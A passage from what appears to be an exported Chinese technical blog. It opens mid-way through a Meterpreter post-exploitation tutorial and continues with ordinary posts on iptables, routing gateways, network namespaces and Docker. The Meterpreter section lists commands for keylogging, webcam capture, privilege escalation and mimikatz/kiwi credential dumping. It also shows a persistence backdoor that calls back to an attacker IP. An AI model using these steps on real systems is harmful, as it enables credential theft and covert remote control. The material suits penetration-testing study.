连接。反射连接的时候加载dll链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS/1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS/1.0进行数据传输。 Meterpreter的特点： Meterpreter完全驻留在内存，没有写入到磁盘。 Meterpreter注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。 默认情况下， Meterpreter的通信是加密的，所以很安全。 扩展性，许多新的特征模块可以被加载。 在设置payloads 时，可以将payloads设置为：windows/meterpreter/reverse_tcp ，然后获得了meterpreter&gt;就可以干很多事了。 后渗透 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172Meterpreter &gt; ?==========================================核心命令：==========================================命令 说明------- ------------? 帮助菜单background 把当前会话挂到后台运行bg background命令的别名bgkill 杀死后台meterpreter 脚本bglist 列出正在运行的后台脚本bgrun 执行一个meterpreter脚本作为后台线程channel 显示信息或控制活动频道close 关闭一个频道detach 分离Meterpreter会话（用于 http/https）disable_unicode_encoding 禁用 unicode 字符串的编码enable_unicode_encoding 启用 unicode 字符串的编码exit 终止 Meterpreter 会话get_timeouts 获取当前会话超时值guid 获取会话 GUIDhelp 帮助菜单info 显示有关 Post 模块的信息irb 在当前会话中打开一个交互式 Ruby shellload 加载一个或多个 Meterpreter 扩展machine_id 获取连接到会话的机器的 MSF IDmigrate 将服务器迁移到另一个进程pivot 管理枢轴侦听器pry 在当前会话上打开 Pry 调试器quit 终止 Meterpreter 会话read 从通道读取数据resource 运行存储在文件中的命令run 执行一个 Meterpreter 脚本或 Post 模块secure （重新）协商会话上的 TLV 数据包加密sessions 快速切换到另一个会话set_timeouts 设置当前会话超时值sleep 强制 Meterpreter 安静，然后重新建立会话ssl_verify 修改 SSL 证书验证设置transport 管理运输机制use 不推荐使用的load命令别名uuid 获取当前会话的 UUIDwrite 将数据写入通道==========================================Stdapi：文件系统命令==========================================命令 说明------- ------------cat 将文件内容读到屏幕上cd 切换目录checksum 检索文件的校验和cp 将源复制到目标del 删除指定文件dir 列出文件（ls 的别名）download 下载文件或目录edit 编辑文件getlwd 打印本地工作目录getwd 打印工作目录lcd 更改本地工作目录lls 列出本地文件lpwd 打印本地工作目录ls 列出文件mkdir 制作目录mv 将源移动到目标pwd 打印工作目录rm 删除指定文件rmdir 删除目录search 搜索文件show_mount 列出所有挂载点/逻辑驱动器upload 上传文件或目录==========================================Stdapi：网络命令==========================================命令 说明------- ------------arp 显示主机 ARP 缓存getproxy 显示当前代理配置ifconfig 显示界面ipconfig 显示接口netstat 显示网络连接portfwd 将本地端口转发到远程服务resolve 解析目标上的一组主机名route 查看和修改路由表==========================================Stdapi：系统命令==========================================命令 说明------- ------------clearev 清除事件日志drop_token 放弃任何活动的模拟令牌。execute 执行命令getenv 获取一个或多个环境变量值getpid 获取当前进程标识符getprivs 尝试启用当前进程可用的所有权限getid 获取服务器运行的用户的 SIDgetuid 获取服务器运行的用户kill 终止进程localtime 显示目标系统本地日期和时间pgrep 按名称过滤进程pkill 按名称终止进程ps 列出正在运行的进程reboot 重启远程计算机reg 修改远程注册表并与之交互rev2self 在远程机器上调用 RevertToSelf()shell 放入系统命令 shellshutdown 关闭远程计算机steal_token 尝试从目标进程窃取模拟令牌suspend 暂停或恢复进程列表sysinfo 获取有关远程系统的信息，例如 OS==========================================Stdapi：用户界面命令==========================================命令 说明------- ------------enumdesktops 列出所有可访问的桌面和窗口站getdesktop 获取当前的meterpreter桌面idletime 返回远程用户空闲的秒数keyboard_send 发送击键keyevent 发送按键事件keyscan_dump 转储击键缓冲区keyscan_start 开始捕获击键keyscan_stop 停止捕获击键mouse 发送鼠标事件screenshare 实时观看远程用户桌面screenshot 抓取交互式桌面的截图setdesktop 更改meterpreters当前桌面uictl 控制一些用户界面组件==========================================Stdapi：网络摄像头命令：==========================================命令 说明------- ------------record_mic 从默认麦克风录制音频 X 秒webcam_chat 开始视频聊天webcam_list 列出网络摄像头webcam_snap 从指定的网络摄像头拍摄快照webcam_stream 从指定的网络摄像头播放视频流==========================================Stdapi：音频输出命令：==========================================命令 说明------- ------------play 在目标系统上播放波形音频文件 (.wav)==========================================Priv：权限提升命令：==========================================命令 说明------- ------------getsystem 尝试将您的权限提升到本地系统的权限。==========================================Priv：密码数据库命令：==========================================命令 说明------- ------------hashdump 转储 SAM 数据库的内容==========================================Priv：Timestomp 命令：==========================================命令 说明------- ------------timestomp 操作文件 MACE 属性meterpreter &gt; 抓取密码 kiwi模块简介： ​ mimikatz模块已经合并为kiwi模块；使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。 前提： 1. 提权到system权限： 1.1 提到system有两个方法： 一是当前的权限是administrator用户； 二是利用其它手段先提权到administrator用户。然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限。 ​ 1.2 进行提权： 12getuid #查看当前会话用户身份getsystem #自动尝试提权 2. 进程迁移： kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。 所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。 1、查看当前系统信息，可以看出目标系统是64位的： 命令： 1sysinfo #查看当前系统信息 2、查看进程信息： 命令： 1ps #查看进程 3、把进程迁移到PID为504这个程序中(因为当前用户)： 注：因为目标系统是64位的所以需要把meterpreter进程迁移到一个64位程序的进程中。 命令： 1migrate [PID] 三、kiwi模块的使用： 12load kiwi #加载kiwi模块help kiwi #查看kiwi模块的使用 一些有关密码和凭据的命令： 123456789101112131415161718creds_all： #列举所有凭据creds_kerberos： #列举所有kerberos凭据creds_msv： #列举所有msv凭据creds_ssp： #列举所有ssp凭据creds_tspkg： #列举所有tspkg凭据creds_wdigest： #列举所有wdigest凭据dcsync： #通过DCSync检索用户帐户信息dcsync_ntlm： #通过DCSync检索用户帐户NTLM散列、SID和RIDgolden_ticket_create： #创建黄金票据kerberos_ticket_list： #列举kerberos票据kerberos_ticket_purge： #清除kerberos票据kerberos_ticket_use： #使用kerberos票据kiwi_cmd： #执行mimikatz的命令，后面接mimikatz.exe的命令lsa_dump_sam： #dump出lsa的SAMlsa_dump_secrets： #dump出lsa的密文password_change： #修改密码wifi_list： #列出当前用户的wifi配置文件wifi_list_shared： #列出共享wifi配置文件/编码 1. creds_all： 该命令可以列举系统中的明文密码: 命令： 1creds_all #列举所有凭据 2. kiwi_cmd： 123kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令:kiwi_cmd sekurlsa::logonpasswords 生成持续性后门 因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。总不可能我们每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机。 建立持续性后门有两种方法，一种是通过启动项启动(persistence) ，一种是通过 服务启动(metsvc) 启动项启动 启动项启动的话，我们先生成一个后门工具，传送门——&gt; 使用msfvenom生成多平台后门木马 然后放到windows的启动目录中： 1C:\\Users\\$username$\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 这样这个后门每次开机就都能启动了，然后我们只要相连就监听相应的端口就行了。 服务启动 通过服务启动，我们可以运行命令 123run persistence -X -i 5 -p 8888 -r 192.168.10.27 #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀#然后它就在目标机新建了这个文件：C:\\Windows\\TEMP\\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动 https://zhuanlan.zhihu.com/p/61412226 https://blog.csdn.net/weixin_45588247/article/details/119614618 meterpreter后渗透攻击部分命令 MSF中kiwi(mimikatz)模块的使用 https://www.anquanke.com/post/id/235631#h3-28 https://wangjun.dev/2016/04/metasploit-generate-backdoor/"},{"title":"iptables实战","date":"2022-04-25","updated":"2024-03-19","path":"2022/04/25/iptables实战/","text":"iptables 匹配规则： [-i|o 网卡名称]：i是指定数据包从哪块网卡进入，o是指定数据包从哪块网卡输出 [-p 协议类型]：可以指定规则应用的协议，包含tcp、udp和icmp等 [-s 源IP地址]：源主机的IP地址或子网地址 [--sport 源端口号]：数据包的IP的源端口号 [-d目标IP地址]：目标主机的IP地址或子网地址 [--dport目标端口号]：数据包的IP的目标端口号 m：extend matches，这个选项用于提供更多的匹配参数，如： -m state --state ESTABLISHED,RELATED -m tcp --dport 22 -m multiport --dports 80,8080 -m icmp --icmp-type 8 &lt;-j 动作&gt;：处理数据包的动作，包括ACCEPT、DROP、REJECT等 具体实例参考 iptables常用实例备查。 环境搭建 1 系统日志 %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 安全日志 %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 应用程序日志 %SystemRoot%\\System32\\Winevt\\Logs\\Application.ev"},{"title":"网关为0.0.0.0含义","date":"2022-04-23","updated":"2024-03-19","path":"2022/04/23/网关为0-0-0-0含义/","text":"网关为0.0.0.0 或者* 表示表示此条路由不需要通过网关转发，目标地址和自己属于同一个二层网络，通过ARP协议获取目标的MAC地址后通信，比如一些虚拟网卡，不需要路由。 在Linux上配置其他网段路由的时候一定要指明网关，而不是只指明这个网段的出接口，否则会默认本目标网段与接口是直连的。 route add default dev eth0 等效为：route add -net 0.0.0.0 netmask 0.0.0.0 dev eth0。下一跳是eth0设备，使用此路由的数据直接发往目标IP。 route add default gw * dev eth0 等效为：route add -net 0.0.0.0 netmask 0.0.0.0 gw * dev eth0。下一跳是gw IP地址，数据通过网关转发。 路由下一跳是接口还是IP设备的最大区别就是ARP表的区别：下一跳是IP设备的话，数据包毫无疑问交给了IP网关，但是如果下一跳只是接口的话是需要单独对目标ip做arp解析的，如果IP网关上没有开启接口的proxy arp feature的话是不会响应这个arp请求，数据包无法完成二层封装，无法发送出去 实验 说明 PC为内网主机。PC_ROUTE为路由器，有内网网卡和公网网卡（需要开启ip_forward转发）。Inter_Server作为其他网段的服务器，有外网接口STR和内网服务地址S_eth0。 PC默认路由发往PC_ROUTE，PC_ROUTE默认路由发往RTS。Inter_Server做三种配置：1.不配置默认路由 2. 配置到PC网段的目标路由，不设置网关。route add -net 192.168.0.0/24 dev STR。3. 配置到PC网段的目标路由，设置网关。route add -net 192.168.0.0/24 gw 10.10.0.20 dev STR 配置 创建三个namespace 12345678# 本地主机$ ip netns add PC # 路由$ ip netns add PC_ROUTE# 远程服务主机$ ip netns add Inter_Server 创建2对veth 123$ ip link add PTR type veth peer name RTP$ ip link add RTS type veth peer name STR 将veth分别加入到创建的namespace中 123456789# PTR加入到本地PC$ ip link set PTR netns PC # RTP RTS加入到中间路由$ ip link set RTP netns PC_ROUTE$ ip link set RTS netns PC_ROUTE# STR加入到远程服务主机$ ip link set STR netns Inter_Server 设置IP地址并启动网卡 1234# 进入到PC的namespace bash中$ ip netns exec PC bash$ ip address add 192.168.0.2/24 dev PTR$ ip link set PTR up 同理设置其他的IP 1234# 进入到路由的namespace bash中$ ip netns exec PC_ROUTE bash$ ip address add 192.168.0.1/24 dev RTP$ ip address add 10.10.0.20/24 dev RTS 1234567# 进入到远程服务的namespace bash中$ ip netns exec Inter_Server bash$ ip address add 10.10.0.10/24 dev STR#远程服务添加第二块网卡S_eth0$ ip link add S_eth0 type dummy$ ip address add 2.2.2.2/32 dev S_eth0$ ip link set S_eth0 up 设置PC、PC_ROUTE默认路由 1234# PC默认路由route add default gw 192.168.0.1 dev PTR# PC_ROUTE默认路由,不设置默认网关route add default dev RTS 测试 此时PC与PC_ROUTE可以互通，PC_ROUTE与Inter_Server互通，PC与Inter_Server不通 在Inter_Server加入不设置网关的默认路由 1route add -net 192.168.0.0/24 dev STR 此时PC仍ping不同Inter_Server 抓包发现此时Inter_Server要向192.168.0.2发送数据包需要先ARP协议询问地址。 在Inter_Server加入设置网关的默认路由 1route add -net 192.168.0.0/24 gw 10.10.0.20 dev STR 可以发现此时Inter_Server不需要arp查询192.168.0.2mac地址了，而是直接将数据包发往网关mac地址交由网关转发。 同网段和不同网段的ARP协议 0.0.0.0 网关的含义 Task-centered iproute2 user guide"},{"title":"docker常用","date":"2022-04-20","updated":"2024-03-19","path":"2022/04/20/docker常用/","text":"列出docker镜像 1docker images -a 列出docker网络 1docker network ls 列出所有容器基本信息 1docker ps -a 运行容器并进入容器内部 1234docker run -it -P --network localnet -v /var/www/html:/var/www/html fauria/lamp:v2 /bin/bash# -P 将容器内服务端口随机映射到主机端口# --network 将容器网络连接到指定网络，例如Host、bridge# -v 将主机的目录映射到容器内的某个目录 退出容器并保持容器后台运行 1键盘按键组合: Ctrl+p+q 查看指定容器端口映射 1docker port container_id 进入到正在运行的容器内部 1docker exec -it 0 /bin/bash 查看某个容器的详细配置 1docker inspect container_name 查看某个容器的PID 1docker inspect trusting_mayer -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; 查看某个网络的具体配置 1docker network inspect bridge # 查看bridge网络 查看容器的ns 问题及解决: docker创建的Network Namespace无法显示 问题 Docker Container Network Namespace is Invisible 1234567891011121314151617# 查看container PID$ docker inspect container_name -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27;# 在 /proc/&#123;pid&#125;/ns 查看对应container进程的 NameSpace$ ls -al /proc/3180/nstotal 0dr-x--x--x 2 root root 0 Apr 21 20:03 .dr-xr-xr-x 9 root root 0 Apr 21 20:03 ..lrwxrwxrwx 1 root root 0 Apr 21 20:13 cgroup -&gt; &#x27;cgroup:[4026531835]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:04 ipc -&gt; &#x27;ipc:[4026532637]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:04 mnt -&gt; &#x27;mnt:[4026532635]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:03 net -&gt; &#x27;net:[4026532640]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:04 pid -&gt; &#x27;pid:[4026532638]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:13 pid_for_children -&gt; &#x27;pid:[4026532638]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:13 time -&gt; &#x27;time:[4026531834]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:13 time_for_children -&gt; &#x27;time:[4026531834]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:13 user -&gt; &#x27;user:[4026531837]&#x27;lrwxrwxrwx 1 root root 0 Apr 21 20:04 uts -&gt; &#x27;uts:[4026532636]&#x27; 从namespace目录伪文件列表中，我们可以看到此过程的net文件的存在。由于Net文件对应于Linux网络命名空间，因此我们可以在列出所有网络名称空间时显示它。但是，我们可以看到并非如此。例如，运行ip netns ls显示无结果： 12$ ip netns ls$ 作为对比，我们手动创建的ns是可以列出的: 123$ ip netns add own_netns1$ ip netns ls own_netns1 原因 ip netns ls是在/var/run/netns目录下寻找netns的，但是docker并不会在这个目录下创建ns的引用文件，所以netns命令无法找到docker创建的netns。 docker的容器所在的网络空间可以通过inspect查看 解决办法 在/var/run/netns目录下创建个以容器id命名的空文件 12$ mkdir -p /var/run/netns$ touch /var/run/netns/$container_id 将/proc/&#123;PID&#125;/ns/net 或者/var/run/docker/netns/&#123;id&#125;文件挂载到/var/run/netns/$container_id下 1mount -o bind /var/run/docker/netns/86e269290fda /var/run/netns/86e269290fda 注意不要用软连接来代替mount，因为pid是可重用的，可能会造成docker结束后ip netns错误寻找成其他进程netns。 阿斯顿 Docker-从入门到实践 研究pipework"},{"title":"iptables防火墙","date":"2022-04-19","updated":"2024-03-19","path":"2022/04/19/iptables防火墙/","text":"1. 简介 iptables实际上只是位于用户空间的一个面向系统管理员的Linux防火墙的管理工具，而真正实现防火墙功能的是netfilter，它是Linux内核中实现包过滤的内核模块，iptables对应在内核中的模块应该是ip_tables，我们查看系统内核中ip_tables的信息的时候可以看到ip_tables.ko这个模块是在netfilter这个目录下的。 iptables的作用是为包过滤机制的实现提供规则，通过各种不同的规则，告诉netfilter对来自某些源，前往某些目的或具有某些协议特征的数据包应该如何处理，下面这张图很明了的说明了Netfilter和iptables之间的关系 2. iptables的四表五链 为了更加方便的组织和管理防火墙规则，iptables采用了表和链的分层结构 其中，每个规则表相当于内核空间的一个容器，根据规则集的不同用途划分为默认的四个表，在每个表容器内又包括不同的规则链，根据处理数据包的不同时机划分为五种链 2.1 iptables 4表： 表名称 规则含义 包含的链 内核模块 filter 表 用来对数据包进行过滤，具体的规则要求决定如何处理一个数据包。 input、forward、output iptable_filter nat 表 nat 全称：network address translation 网络地址转换，主要用来修改数据包的 IP 地址、端口号信息。 prerouting、output、postrouting iptable_nat mangle 表 主要用来修改数据包的服务类型，生存周期，为数据包设置标记，实现流量整形、策略路由等。 prerouting、input、forward、output、postrouting iptable_mangle raw 表 主要用来决定是否对数据包进行状态跟踪。 prerouting、output iptable_raw raw表只使用在PREROUTING链和OUTPUT链上,因为优先级最高，从而可以对收到的数据包在系统进行ip_conntrack（连接跟踪）前进行处理。一但用户使用了raw表,在某个链上，raw表处理完后，将跳过NAT表和ip_conntrack处理，即不再做地址转换和数据包的链接跟踪处理了。RAW表可以应用在那些不需要做nat的情况下，以提高性能。 应用最多的是filter和nat。 2.2 iptables 5链： 在处理各种数据包时，根据防火墙规则的不同介入时机，iptables默认划分为五种不同的规则链： PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING 链名称 规则含义 prerouting 链 在对数据包做路由选择之前，将应用此链中的规则 input 链 当收到访问防火墙本机地址的数据包时，将应用此链中的规则 forward 链 当收到需要通过防火墙中转发给其他地址的数据包时，将应用此链中的规则，注意如果需要实现forward转发需要开启Linux内核中的ip_forward功能 output 链 当防火墙本机向外发送数据包时，做路由选择之后，将应用此链中的规则 postrouting 链 在对数据包做路由选择之后，将应用此链中的规则 这里需要强调的一点是FORWARD链，它是转发链，也就是说只有在网卡个数&gt;=2的系统中才具有的功能：开启系统转发功能后，当网络层发现数据包并非发给本机时会从另一网卡转发出去。中间经过FORWARD链，FORWARD链上的规则由Filter表、Mangle表读取操作。 2.3 表和链的对应关系 3. 包过滤的匹配流程 当一个数据包到达防火墙以后，会优先选择哪一个表、哪一个链中的规则呢？ 表的处理优先级：raw&gt;mangle&gt;nat&gt;filter 规则链的应用顺序取决于数据的流向： 入站数据流向：PREROUTING→路由选择→INPUT→应用程序 转发数据流向：PREROUTING→路由选择→FORWARD→POSTROUTING 出站数据流向：路由选择→OUTPUT→POSTROUTING 路由选择时机 规则链内部的处理规则： 按第一条规则……第二条规则的顺序进行匹配处理，遵循“匹配即停止”的原则， 一旦找到一条匹配规则将不再检查后续的其他规则，如果一直找不到匹配的规则，就按默认规则处理。 这些表并非必须全部使用，是可选的，最常用的是nat,filter 3.1 单双网卡图示 来源 看图中深蓝色箭头的数据流向，数据包要到达用户层，需要经过PREROUTING链(路由前链)，INPUT链(输入链)，在这个链路中存放着用户设置的规则，这些规则根据功能不同又会被分组存放在RAW表、Mangle表和NAT表中。当数据包抵达PREROUTING链时，netfilter程序会依次从RAW表、Mangle表和NAT表中取出针对PREROUTING链的用户规则并执行相应操作；同理，INPUT链上的规则也会被分组存放在Mangle表和Filter表中，netfilter程序会依次从这两个表中取出针对INPUT链设置的用户规则并执行相应操作。（特别强调，转发的数据包不经过 OUTPUT 链） 这里需要强调的一点是FORWARD链，它是转发链，也就是说只有在网卡个数&gt;=2的系统中才具有的功能：开启系统转发功能后，当网络层发现数据包并非发给本机时会从另一网卡转发出去。中间经过FORWARD链，FORWARD链上的规则由Filter表、Mangle表读取操作。对于单网卡的系统中，上图应更改为： 3.2 iptables常见情况 关键点在于发往iptables主机的数据包的目的地址是否是iptables主机本机。如果是，那我们就可以理解为常见的开启了iptables防火墙的网站服务器主机；如果不是，那就是走ip_forward进行转发，比如我们常见的NAT路由器的NAT服务和策略路由等。 1cat /proc/sys/net/ipv4/ip_forward #查看ip_forward状态 4. iptables的配置 4.1 iptables 的基本语法命令格式 1iptables [-t 表名] 管理选项 [链名] [匹配条件] [-j 控制类型] 表名、链名：指定iptables命令所操作的表和链，未指定表名时将默认使用filter表； 管理选项：表示iptables规则的操作方式，比如：插入、增加、删除、查看等； 匹配条件：指定要处理的数据包的特征，不符合指定条件的数据包不处理； 控制类型：指数据包的处理方式，比如：允许accept、拒绝reject、丢弃drop、日志LOG等； iptables 管理选项 管理选项 含义 示例 -A 在指定链的末尾添加一条新的规则 iptables -A INPUT -D 删除指定链中的某一条规则，可删除指定序号或具体内容 iptables -t nat -D INPUT -I 在指定链中插入一条新规则，原本该位置上的规则会往后顺序移动，没有指定编号则为1 iptables -I INPUT -R 修改、替换指定链中的某一条规则，可指定规则序号或具体内容 iptables -t nat -R INPUT -L 列出指定链中所有的规则，未指定链名，则列出表中的所有链 iptables -t nat -L -F 清空指定链中所有的规则，未指定链名，则清空表中的所有链 -P 设置指定链的默认策略 -n 使用数字形式显示输出结果 iptables -t nat -nvl -v 查看规则列表时显示详细的信息 -h 查看命令帮助信息 –line-numbers 查看规则列表时，同时显示规则在链中的顺序号 -N或–new-chain 用命令中所指定的名称创建一个新链 iptables -N allowed-chain -X 或 --delete-chain 如果指定链名，该命令删除这条自定义的链， 如果未指定链名，该命令删除所有自定义的链。此参数用于快速清除所有自定义的链，当然，默认的链无法删除。 iptables -X MY_OWN_chain iptables 匹配规则： [-i|o 网卡名称]：i是指定数据包从哪块网卡进入，o是指定数据包从哪块网卡输出 [-p 协议类型]：可以指定规则应用的协议，包含tcp、udp和icmp等 [-s 源IP地址]：源主机的IP地址或子网地址 [--sport 源端口号]：数据包的IP的源端口号 [-d目标IP地址]：目标主机的IP地址或子网地址 [--dport目标端口号]：数据包的IP的目标端口号 m：extend matches，这个选项用于提供更多的匹配参数，如： -m state --state ESTABLISHED,RELATED -m tcp --dport 22 -m multiport --dports 80,8080 -m icmp --icmp-type 8 &lt;-j 动作&gt;：处理数据包的动作，包括ACCEPT、DROP、REJECT等 具体实例参考 iptables常用实例备查。 协议匹配 -p指定协议名，该通用协议匹配用于检查某些特定协议。 支持的协议有 TCP 、 UDP 、 ICMP 、udplite、 icmpv6、esp、 ah、 sctp、 mh、用逗号分隔的任何这三种协议的组合列表 以及 ALL （用于所有协议）。 ALL 是缺省匹配。可以使用 ! 符号，它表示不与该项匹配。 例1: 不允许任何主机ping本主机(默认在filter链添加规则) 123456$ iptables -A INPUT -p icmp -j REJECT$ iptables -nL Chain INPUT (policy ACCEPT)target prot opt source destination REJECT icmp -- 0.0.0.0/0 0.0.0.0/0 reject-with icmp-port-unreachable 例2：接收除icmp之外的其他连接，!表示取反 123456$ iptables -A INPUT ! -p icmp -j ACCEPT$ iptables -nL Chain INPUT (policy ACCEPT)target prot opt source destination ACCEPT !icmp -- 0.0.0.0/0 0.0.0.0/0 注意：此时还是可以ping通此机器的，因为定义的规则是接收除icmp之外的其他连接，只要非icmp协议的包就ACCEPT，但并不代表icmp包就要丢弃，实际上对于ICMP包并不会匹配到我们设置的规则，因而会继续寻找下一条规则，表中只有一条规则 所以最终会匹配到默认规则，而默认规则是ACCPET，所以依然被放行了。接下来如果将INPUT链的默认规则改为DROP就ping不通了（INPUT OUTPUT链不能设置默认REJECT）： 123456$ iptables -P INPUT DROP $ iptables -nL Chain INPUT (policy DROP)target prot opt source destination ACCEPT !icmp -- 0.0.0.0/0 0.0.0.0/0 地址匹配 iptables编写地址匹配的规则时用-s：表示源地址，-d：表示目标地址 例1：不允许192.168.100.200这个主机ping本主机 接口匹配 当本机有多个网卡时，可以使用-i选项去匹配报文是通过哪块网卡流入本机的。 例1：拒绝由网卡ens33流入的ping请求报文 123456$ iptables -A INPUT -i ens33 -p icmp -j DROP $ iptables -nL Chain INPUT (policy ACCEPT)target prot opt source destination DROP icmp -- 0.0.0.0/0 0.0.0.0/0 -i 使用限制： ​ -i选项是用于匹配报文流入的网卡的，也就是说，从本机发出的报文是不可能会使用到-i选项的，因为这些由本机发出的报文压根不是从网卡流入的，而是要通过网卡发出的，从这个角度考虑，-i选项的使用是有限制的。 为了更好的解释-i选项，一张iptables全局报文流向图，如下。 既然-i选项是用于判断报文是从哪个网卡流入的，那么，-i选项只能用于上图中的PREROUTING链、INPUT链、FORWARD链，这是-i选项的特殊性，因为它只是用于判断报文是从哪个网卡流入的，所以只能在上图中&quot;数据流入流向&quot;的链中与FORWARD链中存在，而上图中的&quot;数据发出流向&quot;经过的链中，是不可能使用-i选项的，比如上图中的OUTPUT链与POSTROUTING链，他们都不能使用-i选项。 -o 使用限制: ​ 理解完-i选项，再来理解-o选项就好办了。当主机有多块网卡时，可以使用-o选项，匹配报文将由哪块网卡流出，没错，-o选项与-i选项是相对的，-i选项用于匹配报文从哪个网卡流入，-o选项用于匹配报文将从哪个网卡流出。 -i选项只能用于PREROUTING链、INPUT链、FORWARD链，那么-o选项只能用于FORWARD链、OUTPUT链、POSTROUTING链。 因为-o选项是用于匹配报文将由哪个网卡&quot;流出&quot;的，所以与上图中的&quot;数据进入流向&quot;中的链没有任何缘分，所以，-o选项只能用于FORWARD链、OUTPUT链、POSTROUTING链中。 FORWARD链属于&quot;中立&quot;，它能同时使用-i选项与-o选项。 扩展匹配（端口等） &quot;源地址&quot;与&quot;目标地址&quot;属于基本匹配条件，而&quot;源端口&quot;与&quot;目标端口&quot;属于扩展匹配条件，上文中介绍到的匹配条件，都属于基本匹配条件。 基本匹配条件可以直接使用，而如果想要使用扩展匹配条件，则需要依赖一些扩展模块，或者说，在使用扩展匹配条件之前，需要指定相应的扩展模块。 使用选项--dport可以匹配报文的目标端口，–dport意为destination-port，即表示目标端口。 使用–dport选项时，必须事先指定了使用哪种协议，即必须先使用-p选项，示例如下: 例1：拒绝192.168.1.146的ssh连接（ssh端口为22） 1$ iptables -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 22 -j REJECT -m tcp表示使用tcp扩展模块，–dport表示tcp扩展模块中的一个扩展匹配条件，可用于匹配报文的目标端口。 注意，-p tcp与 -m tcp并不冲突，-p用于匹配报文的协议，-m 用于指定扩展模块的名称，正好，这个扩展模块也叫tcp。 上例中，也可以省略-m选项，iptables会&quot;隐式&quot;的指定扩展模块 当使用-p选项指定了报文的协议时，如果在没有使用-m指定对应的扩展模块名称的情况下，使用了扩展匹配条件， iptables默认会调用与-p选项对应的协议名称相同的模块。 例2：开放ftp访问，冒号表示端口的范围从20-21端口 12345[root@firewall ~]# iptables -I INPUT -p tcp --dport 20:21 -j ACCEPT[root@firewall ~]# iptables -LChain INPUT (policy ACCEPT)target prot opt source destination ACCEPT tcp -- anywhere anywhere tcp dpts:ftp-data:ftp 借助tcp扩展模块的–sport或者–dport都可以指定一个连续的端口范围，但是无法同时指定多个离散的、不连续的端口，如果想要同时指定多个离散的端口，需要借助另一个扩展模块，multiport模块。 例3：允许开放25,80,110,143端口，以便访问邮件和网站服务 12345[root@firewall ~]# iptables -A INPUT -p tcp -m multiport --dport 25,80,110,143 -j ACCEPT[root@firewall ~]# iptables -LChain INPUT (policy ACCEPT)target prot opt source destination ACCEPT tcp -- anywhere anywhere multiport dports smtp,http,pop3,imap 例4：不允许192.168.100.110-192.168.100.150范围的主机经过防火墙转发数据包 123456789[root@firewall ~]# iptables -A FORWARD -p tcp -m iprange --src-range 192.168.100.110-192.168.100.150 -j REJECT[root@firewall ~]# [root@firewall ~]# iptables -LChain INPUT (policy ACCEPT)target prot opt source destination Chain FORWARD (policy ACCEPT)target prot opt source destination REJECT tcp -- anywhere anywhere source IP range 192.168.100.110-192.168.100.150 reject-with icmp-port-unreachable 状态匹配 编写iptables规则时使用“-m state --state 连接状态”的形式 常用的连接状态： ​ NEW：与任何连接无关的 ，一个连接的第一个报文，例如TCP连接中的SYN报文 ​ ESTABLISHED：响应请求或者已经建立连接的，第一个成功穿越防火墙的报文之后所有的报文 ​ RELATED：伴随连接的报文，即某个已经处于ESTABLISHED的连接所产生的报文，这些报文不属于第一条连接，但是的确是由第一条连接产生的。与已有连接有相关性，比如ftp数据连接 ​ INVALID：无法判断状态的报文 例1：允许响应请求的连接放行 12345[root@firewall ~]# iptables -I INPUT -p tcp -m state --state ESTABLISHED -j ACCEPT[root@firewall ~]# iptables -LChain INPUT (policy ACCEPT)target prot opt source destination ACCEPT tcp -- anywhere anywhere state ESTABLISHED https://www.cnblogs.com/wanstack/p/8352484.html iptables 控制类型： ACCEPT：允许数据包通过 DROP：直接丢弃数据包，不给任何回应信息 REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息。 SNAT：源地址转换。在进入路由层面的route之前，重新改写源地址，目标地址不变，并在本机建立NAT表项，当数据返回时，根据NAT表将目的地址数据改写为数据发送出去时候的源地址，并发送给主机。解决内网用户用同一个公网地址上网的问题。 MASQUERADE，是SNAT的一种特殊形式，适用于像adsl这种临时会变的ip上 DNAT:目标地址转换。和SNAT相反，IP包经过route之后、出本地的网络栈之前，重新修改目标地址，源地址不变，在本机建立NAT表项，当数据返回时，根据NAT表将源地址修改为数据发送过来时的目标地址，并发给远程主机。可以隐藏后端服务器的真实地址。 REDIRECT：是DNAT的一种特殊形式，将网络包转发到本地host上（不管IP头部指定的目标地址是啥），方便在本机做端口转发。 LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则 除去最后一个LOG，前3条规则匹配数据包后，该数据包不会再往下继续匹配了，所以编写的规则顺序极其关键 4.2 配置实例 